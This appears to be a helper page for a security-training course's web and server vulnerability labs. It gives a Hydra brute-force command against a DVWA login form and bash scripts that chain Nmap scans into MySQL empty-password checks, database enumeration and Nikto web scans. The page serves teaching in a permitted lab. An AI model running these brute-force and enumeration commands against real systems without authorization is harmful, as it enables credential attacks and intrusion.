# H4K Lab Copy/Paste Helpers

This page contains only the longer or more typo-prone commands used in the H4K **Web Application and Server Vulnerabilities** labs.

**Follow the lab book for the actual exercise steps, explanations, and where each item should be used.** Short commands and payloads are intentionally omitted so this page does not replace the lab material.

> Use these commands only against the H4K lab environment or other systems you have explicit permission to test.

---

## Lab 2 — Brute Force Attack

Replace `REPLACE_WITH_PHPSESSID` with the `PHPSESSID` value from your browser session before running the command.

```bash
hydra -l admin -P /rockyou.txt -V dvwa http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: security=low; PHPSESSID=REPLACE_WITH_PHPSESSID:F=Username and/or password incorrect."
```

---

## Lab 8 — Security Scanning

The script blocks below are provided for easier copy/paste into Nano. Follow the lab book for file names, permissions, targets, and execution steps.

### `ip_scan.sh`

```bash
#!/bin/bash
#
# Script to start Nmap scans
#

echo --------------------------------------------
echo "My Nmap Script"
echo --------------------------------------------
echo -e "Please enter your Target IP"
read target
echo Running Nmap Scan against target: $target
nmap -sV -T4 $target
```

### `mysql_scan.sh`

```bash
#!/bin/bash
#
# Script to audit MySQL servers
#

# ask user for target
echo -e "Please enter your Target IP"
read target

# start nmap scan on port 3306
echo Running Nmap Scan against target: $target
nmap -p 3306 $target -oG servers.txt

# filter alive hosts
hosts=$(cat servers.txt | grep open | awk '{print $2}')
count=$(echo "$hosts" | wc -l)

# show how many servers we found or exit if none
if [ -z "$hosts" ]; then
  echo No hosts found
  exit 0
else
  echo -e Found $count hosts \($hosts\)
fi

# Check each server we found if it has an empty password
for server in $hosts; do
  echo -e Bruteforcing passwords on $server
  nmap --script=mysql-empty-password -p 3306 $server
done

# Try to fetch database names from each server
for server in $hosts; do
  echo -e Auditing MySQL on $server
  nmap -p 3306 -d \
    --script mysql-databases \
    --script-args "mysqluser='root'" \
    $server
done
```

### `nmap2nikto.sh`

```bash
#!/bin/bash
#
# Script to audit HTTP servers
#

# ask user for target
echo -e "Please enter your Target IP"
read target

# start nmap scan on port 80 and 443
echo Running Nmap Scan against target: $target
nmap -p 80,443 $target -oG web_servers.txt

# filter alive hosts
hosts=$(cat web_servers.txt | grep open | awk '{print $2}')
count=$(echo "$hosts" | wc -l)

# show how many servers we found or exit if none
if [ -z "$hosts" ]; then
  echo No hosts found
  exit 0
else
  echo -e Found $count hosts \($hosts\)
fi

# Test each server with Nikto for security issues
for server in $hosts; do
  echo -e Running Nikto against $server
  nikto -h $server
done
```
